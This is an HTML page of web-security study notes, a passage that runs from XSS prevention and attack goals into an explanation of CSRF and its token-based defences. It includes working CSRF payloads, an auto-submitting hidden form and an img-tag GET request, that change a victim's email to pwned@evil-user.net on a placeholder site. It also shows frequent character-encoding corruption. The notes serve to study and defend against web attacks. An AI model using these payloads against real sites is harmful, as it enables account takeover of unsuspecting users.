                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">&lt;a href="#" onclick="x='This string needs two layers of escaping'"&gt;test&lt;/a&gt;</code>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3 &rarr; Use Frameworks That Auto-Escape &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Sanitize HTML if You Allow It</strong> Ã¢â‚¬â€œ Use libraries like <code>DOMPurify</code>.</li>
                      <li style="margin-bottom: 10px;"><strong>Set HTTP Headers</strong> Ã¢â‚¬â€œ Use <code>Content-Security-Policy (CSP)</code>.</li>
                      <li style="margin-bottom: 10px;"><strong>Set <code>X-Content-Type-Options: nosniff</code></strong> - Prevent browsers from MIME-sniffing uploaded files or responses, ensuring the declared Content-Type is respected.</li>
                      <li style="margin-bottom: 10px;"><strong>Avoid Inline JS/HTML Injection</strong> Ã¢â‚¬â€œ No <code>onclick=</code>, use JS files instead.</li>
                      <li style="margin-bottom: 10px;"><strong>Avoid use unsafe JS functions</strong> - same <code>.innerHTML</code> and use <code>.textContent</code></li>
                      <li style="margin-bottom: 10px;"><strong>Use HTTP-Only Cookies for Sensitive Data</strong> - Protect session cookies and other sensitive data from being accessed by XSS-injected scripts.</li>
                      <li style="margin-bottom: 10px;"><strong>Use appropriate response headers.</strong> - To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the <code>Content-Type</code> and <code>X-Content-Type-Options</code> headers to ensure that browsers interpret the responses in the way you intend.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; What can XSS be used for &rarr;</h2>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>Main goal of XSS is execute JS in victim browser</strong></p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(1) Session Hijacking / Cookie Theft</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Steal the victimÃ¢â‚¬â„¢s <strong>session cookies</strong> (limited to the vulnerable websiteÃ¢â‚¬â„¢s domain due to same-origin policy).</li>
                      <li style="margin-bottom: 10px;">Use stolen cookies/tokens to <strong>impersonate the victim</strong> without knowing their password.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(2) Browser Exploitation</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Exploit vulnerabilities in the browser or its plugins to <strong>gain deeper control</strong> over the system.</li>
                      <li style="margin-bottom: 10px;">Can lead to <strong>drive-by downloads</strong> or even RCE (remote code execution) if a browser exploit is chained.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(3) Keylogging</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Inject scripts that <strong>record keystrokes</strong> (e.g., usernames, passwords, credit card info).</li>
                      <li style="margin-bottom: 10px;">Exfiltrate captured data to the attackerÃ¢â‚¬â„¢s server.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(4) Phishing &amp; Credential Theft</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Inject fake <strong>login forms, popups, or redirects</strong> to trick users into entering credentials.</li>
                      <li style="margin-bottom: 10px;">Bypass user trust since the malicious content appears inside a <strong>legitimate trusted website</strong>.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(5) Social Engineering</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Display deceptive popups, warnings, or alerts <strong>within the trusted site</strong>.</li>
                      <li style="margin-bottom: 10px;">Trick users into clicking malicious links, downloading malware, or approving dangerous actions.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(6) Content Manipulation &amp; Defacement</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Alter page content dynamically (messages, images, prices).</li>
                      <li style="margin-bottom: 10px;">Damage company reputation by spreading false or offensive content.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(7) Data Exfiltration</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Steal sensitive data displayed in the victimÃ¢â‚¬â„¢s session (personal info, financial details, CSRF tokens, etc.).</li>
                      <li style="margin-bottom: 10px;">Read and exfiltrate any <strong>DOM-accessible data</strong>.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(8) Malware Delivery</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Inject malicious scripts that force the victimÃ¢â‚¬â„¢s browser to <strong>download and execute malware</strong>.</li>
                      <li style="margin-bottom: 10px;">Often chained with <strong>drive-by downloads</strong> or exploit kits.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Additional Notes</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Attacker can <strong>masquerade as the victim</strong>, performing any action the user is authorized for.</li>
                      <li style="margin-bottom: 10px;">Can be combined with <strong>CSRF</strong> for advanced exploitation.</li>
                      <li style="margin-bottom: 10px;">High impact when targeting <strong>admins</strong>, as it can lead to <strong>full site compromise</strong>.</li>
                      <li style="margin-bottom: 10px;">Read any data that the user is able to access.</li>
                      <li style="margin-bottom: 10px;">Capture the user's login credentials.</li>
                      <li style="margin-bottom: 10px;">Inject trojan functionality into the web site.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Impact of XSS attacks &rarr;</h2>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>The impact depend of variety of factors, it stored or reflected, cookie accessible or not, where payload executed</strong></p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1. Low Impact</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Cosmetic defacement (popups, alerts).</li>
                      <li style="margin-bottom: 10px;">Harmless script execution.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2. Medium Impact</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Stealing cookies/session tokens &rarr; account takeover of normal users.</li>
                      <li style="margin-bottom: 10px;">Unauthorized actions performed on victimÃ¢â‚¬â„¢s behalf.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3. High Impact</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Admin account takeover &rarr; full compromise of the web application.</li>
                      <li style="margin-bottom: 10px;">Worm-like propagation (e.g., self-replicating payloads in social media).</li>
                      <li style="margin-bottom: 10px;">Delivery of malware to thousands of users.</li>
                      <li style="margin-bottom: 10px;">Bypassing same-origin policy to steal data.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; SOP (Same Origin Policy) &rarr;</h2>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>&rarr; browser security mechanism that restricts how a document or script loaded from one <i>origin</i> can interact with resources from another origin.</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">security mechanism implemented in modern web browsers to prevent a malicious script on one web site from obtaining access to sensitive data on another website.</li>
                      <li style="margin-bottom: 10px;">To determine if JavaScript can access a resource &rarr; <code>Hostname, port, and protocol</code> must match</li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><code>https://example.com:443</code> is a different origin than:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><code>http://example.com</code></li>
                      <li style="margin-bottom: 10px;"><code>https://sub.example.com</code></li>
                      <li style="margin-bottom: 10px;"><code>https://example.com:8443</code></li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; the exception for this is Internet Explorer that donÃ¢â‚¬â„¢t use port.</p>

                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin: 0;"><strong>&rarr; if i have XSS vuln in DVWA it not have impact or access on google because SOP.</strong></p>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Study Resources &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                      <a href="https://www.notion.so/Writeups" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Notes" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Tools" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Tools <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>
                    
                  </div>
                </div>
              </div>
            </article>
            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  Cross-Site Request Forgery (CSRF)
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>

              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">&rarr; What is CSRF? &rarr;</h2>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>&rarr; Web Security Vulnerability that allow attacker induce victim user to make actions that donÃ¢â‚¬â„¢t intend to perform.</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Security vulnerability where an attacker tricks a user's web browser into performing an unwanted action on a trusted site where the user is authenticated.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Think of it like this &rarr;</h3>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;">You are logged into your online banking website (<code>bank.com</code>). Your browser has a valid session cookie.</li>
                      <li style="margin-bottom: 10px;">You then, in another tab, browse to a malicious website created by an attacker.</li>
                      <li style="margin-bottom: 10px;">That malicious site contains hidden code that automatically sends a request to <code>bank.com</code> to transfer money to the attacker's account.</li>
                      <li style="margin-bottom: 10px;">Because your browser is already logged into <code>bank.com</code>, it sends your authentication cookies along with this forged request.</li>
                      <li style="margin-bottom: 10px;">The bank website sees a valid, authenticated request from your browser and executes it.</li>
                    </ol>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">The core concept &rarr;</p>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">The attack exploits the trust that a web application has in the user's browser. The application receives a request with valid credentials and has no way of knowing that the user didn't <em>intentionally</em> send it.</p>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Causes of CSRF? &rarr;</h2>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Automatic Cookie Submission &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Browsers automatically send a user's authentication cookies (session tokens) with every request to a website, <strong>regardless of where the request originated from</strong>. This is the fundamental trust mechanism CSRF exploits.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">No Origin Validation &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The vulnerable web application <strong>does not check where the request came from</strong>. It processes any request that has a valid session cookie, trusting that the user intentionally sent it.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Predictable Actions &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The attacker can easily forge the request because the sensitive action (e.g., changing an email, transferring funds) uses simple, predictable parameters (like <code>?amount=1000&amp;to=attacker</code>) that require no secret, unique value.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Absence of CSRF Tokens &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">A CSRF token is a unique, secret, and unpredictable value generated by the server-side application and embedded in forms or headers. The server validates this token with every state-changing request.</li>
                      <li style="margin-bottom: 10px;"><strong>The Cause:</strong> If an application does <strong>not</strong> require a CSRF token for its state-changing requests, it has no way of distinguishing a legitimate request (from its own website, which knows the token) from a forged request (from a malicious site, which cannot guess the token).</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; What is the impact of a CSRF attack? &rarr;</h2>
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">In a successful CSRF attack &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>&rarr; the attacker causes the victim user to carry out an action unintentionally &rarr;</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.</li>
                      <li style="margin-bottom: 10px;"><strong>Unauthorized Access &rarr;</strong> Attackers can access and control a user's actions, putting them at risk of losing money, damaging their reputation, and facing legal consequences.</li>
                      <li style="margin-bottom: 10px;"><strong>Exploiting Trust &rarr;</strong> CSRF exploits the trust websites put in their users, undermining the sense of security in online browsing.</li>
                      <li style="margin-bottom: 10px;"><strong>Stealthy Exploitation &rarr;</strong> CSRF works quietly, using standard browser behaviour without needing advanced malware. Users might be unaware of the attack, making them susceptible to repeated exploitation.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How does CSRF work? &rarr;</h2>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>CSRF attack to be possible, three key conditions must be in place:</strong></p>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;"><strong>Must be authenticated user</strong> and application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.</li>
                      <li style="margin-bottom: 10px;"><strong>No unpredictable request parameters,</strong> The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.</li>
                      <li style="margin-bottom: 10px;"><strong>Action</strong> same change password.</li>
                    </ol>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Example &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><em>Suppose an application contains a function that lets the user change the email address on their account.</em></p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Request &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com</code>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">This meets the conditions required for CSRF:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The action of changing the email address on a user's account is of interest to an attacker. Following this action, the attacker will typically be able to trigger a password reset and take full control of the user's account.</li>
                      <li style="margin-bottom: 10px;">The application uses a session cookie to identify which user issued the request. There are no other tokens or mechanisms in place to track user sessions.</li>
                      <li style="margin-bottom: 10px;">The attacker can easily determine the values of the request parameters that are needed to perform the action.</li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Payload is &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">&lt;html&gt;
    &lt;body&gt;
        &lt;form action="https://vulnerable-website.com/email/change" method="POST"&gt;
            &lt;input type="hidden" name="email" value="pwned@evil-user.net" /&gt;
        &lt;/form&gt;
        &lt;script&gt;
            document.forms[0].submit();
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;</code>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; What happen when victim click on link &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The attacker's page will trigger an HTTP request to the vulnerable website.</li>
                      <li style="margin-bottom: 10px;">If the user is logged in to the vulnerable website, their browser will automatically include their session cookie in the request (assuming SameSite cookies are not being used).</li>
                      <li style="margin-bottom: 10px;">The vulnerable website will process the request in the normal way, treat it as having been made by the victim user, and change their email address.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How to construct a CSRF attack? &rarr;</h2>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;">Manually creating the HTML needed for a CSRF exploit can be cumbersome, particularly where the desired request contains a large number of parameters, or there are other quirks in the request.</li>
                      <li style="margin-bottom: 10px;">Or we can use <strong>CSRF PoC Generator</strong> in Burp Suite &rarr;
                        <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                          <li>Select a request anywhere in Burp Suite Professional that you want to test or exploit.</li>
                          <li>From the right-click context menu, select Engagement tools / Generate CSRF PoC.</li>
                          <li>Burp Suite will generate some HTML that will trigger the selected request (minus cookies, which will be added automatically by the victim's browser).</li>
                          <li>You can tweak various options in the CSRF PoC generator to fine-tune aspects of the attack. You might need to do this in some unusual situations to deal with quirky features of requests.</li>
                          <li>Copy the generated HTML into a web page, view it in a browser that is logged in to the vulnerable website, and test whether the intended request is issued successfully and the desired action occurs.</li>
                        </ul>
                      </li>
                    </ol>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How to deliver a CSRF exploit? &rarr;</h2>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;"><strong>The delivery mechanisms for cross-site request forgery attacks are essentially the same as for reflected XSS.</strong>
                        <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                          <li>Typically, the attacker will place the malicious HTML onto a website that they control, and then induce victims to visit that website.</li>
                          <li>This might be done by feeding the user a link to the website, via an email or social media message.</li>
                          <li>Or if the attack is placed into a popular website (for example, in a user comment), they might just wait for users to visit the website.</li>
                        </ul>
                      </li>
                      <li style="margin-bottom: 10px;"><strong>Note that some simple CSRF exploits employ the <code>GET</code> method and can be fully self-contained with a single URL on the vulnerable website.</strong>
                        <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                          <li>In this situation, the attacker may not need to employ an external site, and can directly feed victims a malicious URL on the vulnerable domain.</li>
                          <li>In the preceding example, if the request to change email address can be performed with the GET method, then a self-contained attack would look like this &rarr;
                            <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-top: 10px; margin-bottom: 10px; overflow-x: auto;">&lt;img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"&gt;</code>
                          </li>
                          <li>Send link directly or use <code>img</code> tag to make it in app and sent link of app to user and when try to open <code>img</code> load and execute payload.</li>
                        </ul>
                      </li>
                    </ol>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Defences against CSRF and How to Prevent CSRF Vulnerability &rarr;</h2>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1 &rarr; CSRF Token &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; Cross-Site Request Forgery Token</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Unique, secret, unpredictable value generated by Server-side application and shared with client to use it and include correct Token in request when make requests same submit forms.</li>
                      <li style="margin-bottom: 10px;"><strong>This makes it very difficult for an attacker to construct a valid request on behalf of the victim.</strong></li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><em>The most robust way to defend against CSRF attacks is to include a CSRF token within relevant requests. The token must meet the following criteria &rarr;</em></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Unpredictable with high entropy</strong>
                        <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                          <li>The token should be random and hard to guess (like a session ID).</li>
                          <li>If itÃ¢â‚¬â„¢s predictable, an attacker could generate it themselves.</li>
                          <li><strong>Entropy</strong> in security just means: <em>how unpredictable and random something is.</em></li>
                        </ul>
                      </li>
                      <li style="margin-bottom: 10px;"><strong>Tied to the userÃ¢â‚¬â„¢s session</strong>
                        <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                          <li>Each logged-in user gets their own unique token.</li>
                          <li>ItÃ¢â‚¬â„¢s usually stored on the server <em>and</em> sent to the client (e.g., in a hidden form field).</li>
                        </ul>
                      </li>
                      <li style="margin-bottom: 10px;"><strong>Strictly validated</strong>
                        <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                          <li>When the user submits a form or request, the server checks: <em>Does the token match the one I generated for this session?</em></li>
                          <li>If it doesnÃ¢â‚¬â„¢t match (or is missing), the request is rejected.</li>
                        </ul>
                      </li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">One token per user session</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The server issues a single token when the user logs in.</li>
                      <li style="margin-bottom: 10px;">The same token is used in every request until logout or session expiry.</li>
                      <li style="margin-bottom: 10px;"><strong>Pros:</strong> Simpler to implement. Less server-side storage needed.</li>
                      <li style="margin-bottom: 10px;"><strong>Cons:</strong> If an attacker somehow learns the token (e.g., via XSS), it works until the session ends.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">One token per request (sometimes called Ã¢â‚¬Å“double-submitÃ¢â‚¬Â or Ã¢â‚¬Å“rotatingÃ¢â‚¬Â tokens)</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Each request gets a fresh token, often generated and sent after the previous one is validated.</li>
                      <li style="margin-bottom: 10px;"><strong>Pros:</strong> Stronger protection Ã¢â‚¬â€ even if a token leaks, itÃ¢â‚¬â„¢s useless after one use.</li>
                      <li style="margin-bottom: 10px;"><strong>Cons:</strong> More complex Ã¢â‚¬â€ server must manage token state carefully. Can break if the user has multiple tabs open.</li>
                    </ul>
                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin: 0;"><em>A per-request CSRF token is more secure as it limits the attacker's exploit window, but a per-session token is generally recommended for most applications due to its better user experience and reduced server load.</em></p>
                    </div>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">How should CSRF tokens be generated?</h3>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;">CSRF tokens should contain significant entropy and be strongly unpredictable. A token with <strong>high entropy</strong> means itÃ¢â‚¬â„¢s so random that an attacker canÃ¢â‚¬â„¢t realistically guess it.</li>
                      <li style="margin-bottom: 10px;">You should use a cryptographically secure pseudo-random number generator (CSPRNG), seeded with the timestamp when it was created plus a static secret.</li>
                      <li style="margin-bottom: 10px;">If you need further assurance beyond the strength of the CSPRNG, you can generate individual tokens by concatenating its output with some user-specific entropy and take a strong hash of the whole structure.</li>
                    </ol>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">How should CSRF tokens be transmitted?</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">1 &rarr; In a Hidden Field of HTML form (Most Common for HTML Forms)</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The server generates a token and embeds it in a hidden field of an HTML form, that is submitted using the POST method.</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">&lt;input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" /&gt;</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">For additional safety, the field containing the CSRF token should be placed as early as possible within the HTML document.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">2 &rarr; In a Custom HTTP Header</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The server sends the token in a header (e.g., <code>X-CSRF-Token</code>) in its response.</li>
                      <li style="margin-bottom: 10px;">The client's JavaScript code reads this token and then sets the same custom header on all subsequent state-changing requests.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">3 &rarr; Avoid query strings.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Is logged in various locations on the client and server side;</li>
                      <li style="margin-bottom: 10px;">Is liable to be transmitted to third parties within the HTTP Referer header; and can be displayed on-screen.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">How the Server Validates the Token?</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">When a CSRF token is generated, it should be stored server-side within the user's session data.</li>
